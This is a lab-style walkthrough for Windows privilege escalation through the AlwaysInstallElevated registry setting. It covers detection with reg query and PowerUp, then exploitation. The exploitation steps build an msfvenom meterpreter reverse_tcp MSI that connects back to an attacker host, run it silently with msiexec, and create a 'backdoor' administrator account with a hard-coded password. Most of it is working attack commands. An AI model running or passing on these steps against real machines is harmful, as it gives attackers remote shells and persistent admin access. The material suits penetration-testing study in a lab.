#Windows #PrivEsc #Registry #AlwaysInstallElevated #SimpleHTTPServer #msiexec #MSFvenom #metasploit #msfconsole #meterpreter 

## **Detection**  

Windows VM

1. Open command prompt and type: `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`  
2. From the output, notice that “`AlwaysInstallElevated`” value is 1.  
3. In command prompt type: `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
4. From the output, notice that “`AlwaysInstallElevated`” value is 1.
- Can run `PowerUp.ps1` and see this is vulnerable as well - Must open `cmd` at location of `PowerUp.ps1`
```
PS > powershell -ep bypass

PS > . .\PowerUp.ps1

PS > Invoke-AllChecks
```

## **Exploitation**

Kali VM

1. Open command prompt and type: `msfconsole`  
2. In Metasploit (msf > prompt) type: `use multi/handler`  
3. In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp`  
4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`  
5. In Metasploit (msf > prompt) type: `run`  
6. Open an additional command prompt and type: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi`  
7. Copy the generated file, `setup.msi`, to the Windows VM.  
- Metasploit exploit we can also use is `exploit/windows/local/always_install_elevated` need a session as user though

Windows VM

1.Place ‘`setup.msi`’ in ‘`C:\Temp`’.  
2.Open command prompt and type: `msiexec /quiet /qn /i C:\Temp\setup.msi`  
- Can exploit using `PowerUp.ps1`
```
Check output:

PS > Write-UserAddMSI
```
- If you use this exploit, click on "UserAdd" file created, create backdoor creds and assign to Administrator!
	- `backdoor:password123:Administrators`
	- `net localgroup administrators` - see the new account `backdoor`

Enjoy your shell! :)

